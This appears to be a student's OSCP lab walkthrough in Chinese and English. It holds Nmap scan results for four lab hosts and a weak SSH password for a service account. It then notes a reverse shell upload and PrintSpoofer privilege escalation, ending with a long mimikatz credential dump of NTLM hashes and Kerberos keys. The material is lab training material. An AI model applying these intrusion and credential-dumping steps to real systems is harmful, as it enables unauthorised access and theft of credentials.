# Nmap
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_C]
└─$ nmap -sV -T4 -A -iL target
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-10 21:37 CST
Warning: 192.168.250.153 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.250.153
Host is up (0.25s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds?
3007/tcp filtered lotusmtap
5963/tcp filtered indy
8000/tcp open     http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-08-10T13:41:55
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Nmap scan report for 192.168.250.156
Host is up (0.26s latency).
Not shown: 984 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 7e:62:fd:92:52:6f:64:b1:34:48:8d:1e:52:f1:74:c6 (RSA)
|   256 1b:f7:0c:c7:1b:05:12:a9:c5:c5:78:b7:2a:54:d2:83 (ECDSA)
|_  256 ee:d4:a1:1a:07:b4:9f:d9:e5:2d:f6:b8:8d:dd:bf:d7 (ED25519)
25/tcp   open  smtp     Exim smtpd 4.90_1
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.205], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http     nginx
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: oscp.exam &mdash; Coming Soon
110/tcp  open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL RESP-CODES CAPA USER TOP STLS SASL(PLAIN LOGIN) PIPELINING AUTH-RESP-CODE
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
143/tcp  open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: have Pre-login STARTTLS IMAP4rev1 listed capabilities IDLE more LOGIN-REFERRALS AUTH=PLAIN LITERAL+ ENABLE OK post-login AUTH=LOGINA0001 SASL-IR ID
465/tcp  open  ssl/smtp Exim smtpd 4.90_1
|_ssl-date: 2023-08-10T13:43:49+00:00; +1m31s from scanner time.
|_smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.205], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
587/tcp  open  smtp     Exim smtpd 4.90_1
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: 2023-08-10T13:41:44+00:00; -38s from scanner time.
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.205], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: capabilities have post-login IDLE more SASL-IR listed AUTH=PLAIN LITERAL+ ENABLE IMAP4rev1 Pre-login OK AUTH=LOGINA0001 LOGIN-REFERRALS ID
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
2525/tcp open  smtp     Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.205], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: 2023-08-10T13:44:38+00:00; +2m17s from scanner time.
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-11-08T08:15:37
|_Not valid after:  2032-11-05T08:15:37
|_ssl-date: TLS randomness does not represent time
| mysql-info:
|   Protocol: 10
|   Version: 5.7.40-0ubuntu0.18.04.1
|   Thread ID: 8
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, SupportsTransactions, LongPassword, LongColumnFlag, Support41Auth, Speaks41ProtocolOld, ODBCClient, FoundRows, ConnectWithDatabase, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: YVE.\x1B\x07\x06*eL^\x14KK\x1AsX\x06JZ
|_  Auth Plugin Name: mysql_native_password
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
|_http-title: oscp.exam &mdash; Coming Soon
8083/tcp open  http     nginx
|_http-title: Did not follow redirect to https://192.168.250.156:8083/
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: Host: oscp.exam; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1m03s, deviation: 1m30s, median: 1m30s

Nmap scan report for 192.168.250.157
Host is up (0.25s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.45.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0e:ad:d7:de:60:2b:49:ef:42:3b:1e:76:9c:77:33:85 (ECDSA)
|_  256 99:b5:48:fb:77:df:18:b0:1d:ad:e0:92:f3:e1:26:0d (ED25519)
80/tcp    open     http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3905/tcp  filtered mupdate
20000/tcp open     http    MiniServ 1.820 (Webmin httpd)
|_http-server-header: MiniServ/1.820
|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.250.155
Host is up (0.27s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
9099/tcp open  unknown
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.0 200 OK
|     Server: Mobile Mouse Server
|     Content-Type: text/html
|     Content-Length: 321
|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "OSCP" was able to receive your request.</p></BODY></HTML>
9999/tcp open  abyss?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9099-TCP:V=7.92%I=7%D=8/10%Time=64D4E889%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20
SF:Mouse\x20Server\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length
SF::\x20321\r\n\r\n<HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,user-scalable=no\"\x20/></HEAD><
SF:BODY\x20BGCOLOR=#000000><br><br><p\x20style=\"font:12pt\x20arial,geneva
SF:,sans-serif;\x20text-align:center;\x20color:green;\x20font-weight:bold;
SF:\"\x20>The\x20server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\
SF:x20receive\x20your\x20request\.</p></BODY></HTML>\r\n")%r(FourOhFourReq
SF:uest,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mouse\x20S
SF:erver\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x20321\r
SF:\n\r\n<HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewport\"\x20
SF:content=\"width=device-width,user-scalable=no\"\x20/></HEAD><BODY\x20BG
SF:COLOR=#000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sans-seri
SF:f;\x20text-align:center;\x20color:green;\x20font-weight:bold;\"\x20>The
SF:\x20server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20receive
SF:\x20your\x20request\.</p></BODY></HTML>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 320.29 seconds
```

用弱密碼可登入 ssh

```json
web_svc/Diamond1
```

接著上傳 reverse shell 到 C:\\inetpub\\wwwroot 底下，透過 web 觸發執行，
成功切換使用者為 iis apppool\\defaultapppool

接著透過 PrintSpoofer64.exe 成功提權，執行 mimikatz


```json
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1146346 (00000000:00117dea)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 8/14/2023 7:22:57 AM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
	msv :
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c46ab82459deda05be35fe0dd428614d
	 * SHA1     : 208115a5670a3258c6747eef10af998323cc7e5f
	tspkg :
	wdigest :
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 09 94 89 6c cb f4 1d 3d 09 99 68 3b 8b dc b8 a9 97 38 08 24 10 05 dd f6 30 20 75 78 1a 1f cf f5 b3 9c b5 d6 1f 89 44 94 c3 8c f9 cd 59 42 b0 6a 82 10 ea 75 a6 89 63 c6 c3 a6 19 94 d5 f1 5f b7 f7 65 72 24 82 93 4a 44 04 5a 28 97 26 e2 91 45 f3 e2 67 ec e2 3e 72 04 92 9b 9b 31 26 ce 9d 35 58 ef a7 66 94 31 65 24 79 76 7a f1 91 5f 40 15 0e cd 88 b9 05 c7 6e 83 48 0a 29 b4 d8 04 72 7d 40 a6 5e 2b a4 fa 5c b4 0b 68 f6 ab 40 30 89 dd fa b7 00 0f 1f 04 9f b4 6b e6 5c ad 35 28 22 f0 58 e2 45 3e c9 8e a4 26 e9 06 5b 85 55 88 07 4f f3 b0 3f 38 ef e5 88 1f 3c 18 29 5a ea f1 74 c1 6c 93 30 01 0c 2a 0d 63 5a eb ea 3e fe 22 c6 bd 95 a4 e1 57 ba c0 fc 21 4b d1 59 7c a8 05 39 e8 e1 a1 5b 84 f7 39 10 d9 e9 0a 72 c7 d1 ea cc d6
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 1121366 (00000000:00111c56)
Session           : NetworkCleartext from 0
User Name         : web_svc
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 8/14/2023 7:18:47 AM
SID               : S-1-5-21-2610934713-1581164095-2706428072-2606
	msv :
	 [00000003] Primary
	 * Username : web_svc
	 * Domain   : OSCP
	 * NTLM     : 53e938166782a44e241beaf02d081ff6
	 * SHA1     : e7f3a3cf293b58a124e1c636a07dae46ff9946ae
	 * DPAPI    : 1419bfc1f1c29b5a7dbbe53972e7b2bb
	tspkg :
	wdigest :
	 * Username : web_svc
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :
	 * Username : web_svc
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 1119915 (00000000:001116ab)
Session           : Service from 0
User Name         : sshd_5600
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 8/14/2023 7:18:37 AM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-5600
	msv :
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c46ab82459deda05be35fe0dd428614d
	 * SHA1     : 208115a5670a3258c6747eef10af998323cc7e5f
	tspkg :
	wdigest :
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 09 94 89 6c cb f4 1d 3d 09 99 68 3b 8b dc b8 a9 97 38 08 24 10 05 dd f6 30 20 75 78 1a 1f cf f5 b3 9c b5 d6 1f 89 44 94 c3 8c f9 cd 59 42 b0 6a 82 10 ea 75 a6 89 63 c6 c3 a6 19 94 d5 f1 5f b7 f7 65 72 24 82 93 4a 44 04 5a 28 97 26 e2 91 45 f3 e2 67 ec e2 3e 72 04 92 9b 9b 31 26 ce 9d 35 58 ef a7 66 94 31 65 24 79 76 7a f1 91 5f 40 15 0e cd 88 b9 05 c7 6e 83 48 0a 29 b4 d8 04 72 7d 40 a6 5e 2b a4 fa 5c b4 0b 68 f6 ab 40 30 89 dd fa b7 00 0f 1f 04 9f b4 6b e6 5c ad 35 28 22 f0 58 e2 45 3e c9 8e a4 26 e9 06 5b 85 55 88 07 4f f3 b0 3f 38 ef e5 88 1f 3c 18 29 5a ea f1 74 c1 6c 93 30 01 0c 2a 0d 63 5a eb ea 3e fe 22 c6 bd 95 a4 e1 57 ba c0 fc 21 4b d1 59 7c a8 05 39 e8 e1 a1 5b 84 f7 39 10 d9 e9 0a 72 c7 d1 ea cc d6
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 550265 (00000000:00086579)
Session           : Batch from 0
User Name         : Administrator
Domain            : MS01
Logon Server      : MS01
Logon Time        : 7/11/2023 8:33:23 AM
SID               : S-1-5-21-2114389728-3978811169-1968162427-500
	msv :
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : MS01
	 * NTLM     : 3c4495bbd678fac8c9d218be4f2bbc7b
	 * SHA1     : 90afa30798b082c0d0aae85435421502c254d459
	tspkg :
	wdigest :
	 * Username : Administrator
	 * Domain   : MS01
	 * Password : (null)
	kerberos :
	 * Username : Administrator
	 * Domain   : MS01
	 * Password : (null)
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/11/2023 8:31:00 AM
SID               : S-1-5-17
	msv :
	tspkg :
	wdigest :
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 86978 (00000000:000153c2)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/11/2023 8:30:59 AM
SID               : S-1-5-90-0-1
	msv :
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : eaa1d4636ebc36f6c2a4476d4be210c0
	 * SHA1     : 92fa5710f4039fa5b7dc5b08547c15dd05ea5c6a
	tspkg :
	wdigest :
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 2f 03 d3 16 5f 89 31 58 58 5b 7c 46 69 f0 4a b2 18 62 b3 63 fb 00 75 1b 19 75 72 99 47 c8 9e 55 03 94 10 59 77 09 d1 c6 7d 41 bd 7f 01 e0 61 03 03 91 f7 3d d2 f7 cf 35 27 a8 e1 db 37 e3 07 c9 ac f9 e6 4e 59 01 cd b5 96 95 8a de 54 d8 e3 00 aa 5a 19 76 68 40 a0 9e 74 c6 8a 27 81 06 67 41 f3 03 ff 39 8e ba de d4 b5 6e 3b 1f 8c fe 79 46 81 c6 fa e3 e8 6c 7f ad 73 3a 96 3a 66 01 01 f9 62 71 22 bd 63 51 3c dc 8a 89 54 13 3b 79 1d e1 7c 4e 89 a0 dc 60 79 37 85 fe 4e 26 61 ed 4d e2 5c 97 86 35 21 cc 0e b6 8b be 20 76 fb 70 64 07 60 39 07 5d 7b eb cd 15 91 48 c1 3f 1f 81 53 b7 b2 97 91 ae 43 52 80 40 d2 8b 00 b6 4e ca 08 0e cf 2d 37 26 f2 47 9e fc 60 21 03 73 5b dd 1f c3 42 8d 08 df b8 14 3a 79 e3 b7 fb 36 23 31 35 1f
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 86952 (00000000:000153a8)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/11/2023 8:30:59 AM
SID               : S-1-5-90-0-1
	msv :
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c46ab82459deda05be35fe0dd428614d
	 * SHA1     : 208115a5670a3258c6747eef10af998323cc7e5f
	tspkg :
	wdigest :
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 09 94 89 6c cb f4 1d 3d 09 99 68 3b 8b dc b8 a9 97 38 08 24 10 05 dd f6 30 20 75 78 1a 1f cf f5 b3 9c b5 d6 1f 89 44 94 c3 8c f9 cd 59 42 b0 6a 82 10 ea 75 a6 89 63 c6 c3 a6 19 94 d5 f1 5f b7 f7 65 72 24 82 93 4a 44 04 5a 28 97 26 e2 91 45 f3 e2 67 ec e2 3e 72 04 92 9b 9b 31 26 ce 9d 35 58 ef a7 66 94 31 65 24 79 76 7a f1 91 5f 40 15 0e cd 88 b9 05 c7 6e 83 48 0a 29 b4 d8 04 72 7d 40 a6 5e 2b a4 fa 5c b4 0b 68 f6 ab 40 30 89 dd fa b7 00 0f 1f 04 9f b4 6b e6 5c ad 35 28 22 f0 58 e2 45 3e c9 8e a4 26 e9 06 5b 85 55 88 07 4f f3 b0 3f 38 ef e5 88 1f 3c 18 29 5a ea f1 74 c1 6c 93 30 01 0c 2a 0d 63 5a eb ea 3e fe 22 c6 bd 95 a4 e1 57 ba c0 fc 21 4b d1 59 7c a8 05 39 e8 e1 a1 5b 84 f7 39 10 d9 e9 0a 72 c7 d1 ea cc d6
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/11/2023 8:30:59 AM
SID               : S-1-5-19
	msv :
	tspkg :
	wdigest :
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 7/11/2023 8:30:59 AM
SID               : S-1-5-20
	msv :
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c46ab82459deda05be35fe0dd428614d
	 * SHA1     : 208115a5670a3258c6747eef10af998323cc7e5f
	tspkg :
	wdigest :
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :
	 * Username : ms01$
	 * Domain   : OSCP.EXAM
	 * Password : 09 94 89 6c cb f4 1d 3d 09 99 68 3b 8b dc b8 a9 97 38 08 24 10 05 dd f6 30 20 75 78 1a 1f cf f5 b3 9c b5 d6 1f 89 44 94 c3 8c f9 cd 59 42 b0 6a 82 10 ea 75 a6 89 63 c6 c3 a6 19 94 d5 f1 5f b7 f7 65 72 24 82 93 4a 44 04 5a 28 97 26 e2 91 45 f3 e2 67 ec e2 3e 72 04 92 9b 9b 31 26 ce 9d 35 58 ef a7 66 94 31 65 24 79 76 7a f1 91 5f 40 15 0e cd 88 b9 05 c7 6e 83 48 0a 29 b4 d8 04 72 7d 40 a6 5e 2b a4 fa 5c b4 0b 68 f6 ab 40 30 89 dd fa b7 00 0f 1f 04 9f b4 6b e6 5c ad 35 28 22 f0 58 e2 45 3e c9 8e a4 26 e9 06 5b 85 55 88 07 4f f3 b0 3f 38 ef e5 88 1f 3c 18 29 5a ea f1 74 c1 6c 93 30 01 0c 2a 0d 63 5a eb ea 3e fe 22 c6 bd 95 a4 e1 57 ba c0 fc 21 4b d1 59 7c a8 05 39 e8 e1 a1 5b 84 f7 39 10 d9 e9 0a 72 c7 d1 ea cc d6
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 47546 (00000000:0000b9ba)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/11/2023 8:30:59 AM
SID               : S-1-5-96-0-1
	msv :
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c46ab82459deda05be35fe0dd428614d
	 * SHA1     : 208115a5670a3258c6747eef10af998323cc7e5f
	tspkg :
	wdigest :
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 09 94 89 6c cb f4 1d 3d 09 99 68 3b 8b dc b8 a9 97 38 08 24 10 05 dd f6 30 20 75 78 1a 1f cf f5 b3 9c b5 d6 1f 89 44 94 c3 8c f9 cd 59 42 b0 6a 82 10 ea 75 a6 89 63 c6 c3 a6 19 94 d5 f1 5f b7 f7 65 72 24 82 93 4a 44 04 5a 28 97 26 e2 91 45 f3 e2 67 ec e2 3e 72 04 92 9b 9b 31 26 ce 9d 35 58 ef a7 66 94 31 65 24 79 76 7a f1 91 5f 40 15 0e cd 88 b9 05 c7 6e 83 48 0a 29 b4 d8 04 72 7d 40 a6 5e 2b a4 fa 5c b4 0b 68 f6 ab 40 30 89 dd fa b7 00 0f 1f 04 9f b4 6b e6 5c ad 35 28 22 f0 58 e2 45 3e c9 8e a4 26 e9 06 5b 85 55 88 07 4f f3 b0 3f 38 ef e5 88 1f 3c 18 29 5a ea f1 74 c1 6c 93 30 01 0c 2a 0d 63 5a eb ea 3e fe 22 c6 bd 95 a4 e1 57 ba c0 fc 21 4b d1 59 7c a8 05 39 e8 e1 a1 5b 84 f7 39 10 d9 e9 0a 72 c7 d1 ea cc d6
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 47498 (00000000:0000b98a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/11/2023 8:30:59 AM
SID               : S-1-5-96-0-0
	msv :
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c46ab82459deda05be35fe0dd428614d
	 * SHA1     : 208115a5670a3258c6747eef10af998323cc7e5f
	tspkg :
	wdigest :
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 09 94 89 6c cb f4 1d 3d 09 99 68 3b 8b dc b8 a9 97 38 08 24 10 05 dd f6 30 20 75 78 1a 1f cf f5 b3 9c b5 d6 1f 89 44 94 c3 8c f9 cd 59 42 b0 6a 82 10 ea 75 a6 89 63 c6 c3 a6 19 94 d5 f1 5f b7 f7 65 72 24 82 93 4a 44 04 5a 28 97 26 e2 91 45 f3 e2 67 ec e2 3e 72 04 92 9b 9b 31 26 ce 9d 35 58 ef a7 66 94 31 65 24 79 76 7a f1 91 5f 40 15 0e cd 88 b9 05 c7 6e 83 48 0a 29 b4 d8 04 72 7d 40 a6 5e 2b a4 fa 5c b4 0b 68 f6 ab 40 30 89 dd fa b7 00 0f 1f 04 9f b4 6b e6 5c ad 35 28 22 f0 58 e2 45 3e c9 8e a4 26 e9 06 5b 85 55 88 07 4f f3 b0 3f 38 ef e5 88 1f 3c 18 29 5a ea f1 74 c1 6c 93 30 01 0c 2a 0d 63 5a eb ea 3e fe 22 c6 bd 95 a4 e1 57 ba c0 fc 21 4b d1 59 7c a8 05 39 e8 e1 a1 5b 84 f7 39 10 d9 e9 0a 72 c7 d1 ea cc d6
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 45448 (00000000:0000b188)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/11/2023 8:30:59 AM
SID               :
	msv :
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c46ab82459deda05be35fe0dd428614d
	 * SHA1     : 208115a5670a3258c6747eef10af998323cc7e5f
	tspkg :
	wdigest :
	kerberos :
	ssp :
	credman :
	cloudap :	KO

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 7/11/2023 8:30:59 AM
SID               : S-1-5-18
	msv :
	tspkg :
	wdigest :
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :
	 * Username : ms01$
	 * Domain   : OSCP.EXAM
